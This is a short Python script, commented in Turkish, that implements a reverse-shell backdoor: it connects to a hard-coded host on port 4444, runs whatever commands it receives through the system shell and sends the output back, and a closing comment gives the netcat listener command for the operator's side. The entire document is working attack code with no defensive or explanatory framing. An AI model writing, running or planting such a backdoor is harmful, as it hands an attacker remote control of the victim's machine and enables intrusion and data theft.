import socket
import subprocess

def backdoor():
    host = "192.168.1.32" 
    port = 4444  #genelde 4444 tercih et 
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port)) 
    
    while True:
        command = s.recv(1024).decode()  
        if command.lower() == "exit":  
            break  
        
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        s.send(output.stdout.encode() + output.stderr.encode())  
    
    s.close()

backdoor() #sonradan bu kodu dinle bash uzerinden nc -lvp 4444 komutu ile
